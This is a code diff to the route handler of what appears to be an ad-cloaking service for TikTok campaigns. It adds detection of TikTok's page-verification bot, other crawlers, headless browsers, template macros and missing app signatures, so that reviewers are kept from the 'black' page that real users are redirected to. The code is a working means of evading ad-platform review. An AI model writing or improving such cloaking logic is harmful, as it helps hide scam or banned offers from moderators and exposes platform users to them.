@@ -1443,10 +1443,111 @@ export async function registerRoutes(
       
       let paramsValid = false;
       let failReason = "";
+      let isBotDetected = false;
+
+      // ==========================================
+      // ADVANCED BOT DETECTION FOR TIKTOK
+      // ==========================================
+      
+      // 1. Detect TikTok page verification bots by User-Agent
+      const tiktokBotPatterns = [
+        'thirdLandingPageFeInfra',     // TikTok page verification bot
+        'TikTokBot',                    // Generic TikTok bot
+        'bytespider',                   // ByteDance spider
+        'Bytespider',
+        'PetalBot',                     // Huawei crawler
+        'Googlebot',                    // Google crawler
+        'bingbot',                      // Bing crawler
+        'facebookexternalhit',          // Facebook crawler
+        'Twitterbot',                   // Twitter crawler
+        'LinkedInBot',                  // LinkedIn crawler
+        'Slackbot',                     // Slack crawler
+        'WhatsApp',                     // WhatsApp crawler
+        'TelegramBot',                  // Telegram crawler
+        'HeadlessChrome',               // Headless browser
+        'PhantomJS',                    // Headless browser
+        'Puppeteer',                    // Puppeteer automation
+        'Playwright',                   // Playwright automation
+      ];
+      
+      const userAgentLower = userAgent.toLowerCase();
+      for (const pattern of tiktokBotPatterns) {
+        if (userAgent.includes(pattern) || userAgentLower.includes(pattern.toLowerCase())) {
+          isBotDetected = true;
+          failReason = `bot_detected:${pattern}`;
+          console.log(`[Cloak] BOT DETECTED - Pattern: ${pattern} - UA: ${userAgent.substring(0, 100)}`);
+          break;
+        }
+      }
+      
+      // 2. Detect unresolved TikTok macros (bots use template URLs)
+      const unresolvedMacros = [
+        '__CLICKID__',
+        '__CID__',
+        '__AID__',
+        '__AID_NAME__',
+        '__CAMPAIGN_NAME__',
+        '__CAMPAIGN_ID__',
+        '__DOMAIN__',
+        '__PLACEMENT__',
+        '{{clickid}}',
+        '{{campaign_name}}',
+        '${CLICKID}',
+        '${CAMPAIGN}',
+      ];
+      
+      if (!isBotDetected && ttclid) {
+        for (const macro of unresolvedMacros) {
+          if (ttclid.includes(macro) || (cname && cname.includes(macro))) {
+            isBotDetected = true;
+            failReason = `unresolved_macro:${macro}`;
+            console.log(`[Cloak] BOT DETECTED - Unresolved macro: ${macro} in ttclid/cname`);
+            break;
+          }
+        }
+      }
+      
+      // 3. Validate TikTok ttclid format
+      // Real TikTok ttclids start with "E.C.P." and are 200+ characters
+      if (!isBotDetected && ttclid && offer.platform === "tiktok") {
+        if (!ttclid.startsWith('E.C.P.') && ttclid.length < 50) {
+          isBotDetected = true;
+          failReason = 'invalid_ttclid_format';
+          console.log(`[Cloak] BOT DETECTED - Invalid ttclid format: ${ttclid.substring(0, 30)}`);
+        }
+      }
+      
+      // 4. Check TikTok app signature - real traffic must have app identifiers
+      // Real TikTok traffic comes from the TikTok app webview
+      if (!isBotDetected && offer.platform === "tiktok") {
+        const hasTikTokAppSignature = 
+          userAgent.includes('musical_ly') ||
+          userAgent.includes('BytedanceWebview') ||
+          userAgent.includes('TikTok') ||
+          userAgent.includes('bytedance') ||
+          userAgentLower.includes('tiktok');
+          
+        const hasValidReferer = referer && (
+          referer.toLowerCase().includes('tiktok') || 
+          referer.toLowerCase().includes('bytedance') ||
+          referer.toLowerCase().includes('musical.ly')
+        );
+        
+        // Bot if: no TikTok app signature AND no valid referer
+        // This catches bots like the thirdLandingPageFeInfra ones that don't have app signature
+        if (!hasTikTokAppSignature && !hasValidReferer) {
+          isBotDetected = true;
+          failReason = 'no_tiktok_app_signature';
+          console.log(`[Cloak] BOT DETECTED - No TikTok app signature and no valid referer - UA: ${userAgent.substring(0, 100)}`);
+        }
+      }
 
       if (offer.platform === "tiktok") {
-        // TikTok requires: ttclid, cname, xcode
-        if (!ttclid || !cname || !xcode) {
+        // Skip validation if bot was detected
+        if (isBotDetected) {
+          paramsValid = false;
+        } else if (!ttclid || !cname || !xcode) {
+          // TikTok requires: ttclid, cname, xcode
           failReason = "missing_tiktok_params";
         } else if (xcode !== offer.xcode) {
           failReason = "invalid_xcode";
@@ -1509,13 +1610,14 @@ export async function registerRoutes(
           campaignName: offer.platform === "tiktok" ? cname : (fbcl?.split("|")[0] || null),
           campaignId: offer.platform === "facebook" ? (fbcl?.split("|")[1] || null) : null,
           failReason: shouldRedirectToBlack ? null : failReason || `device:${!deviceAllowed};country:${!countryAllowed}`,
+          isBotDetected,
         },
       });
 
       // Increment click counters
       await storage.incrementOfferClicks(offer.id, shouldRedirectToBlack);
 
-      console.log(`[Cloak] ${redirectType.toUpperCase()} redirect for ${slug} (${duration}ms) - device:${deviceType}, country:${country}, params:${paramsValid ? "ok" : failReason}`);
+      console.log(`[Cloak] ${redirectType.toUpperCase()} redirect for ${slug} (${duration}ms) - device:${deviceType}, country:${country}, bot:${isBotDetected}, params:${paramsValid ? "ok" : failReason}`);
 
       // Build final redirect URL with all query params for black page
       let finalUrl = targetUrl;
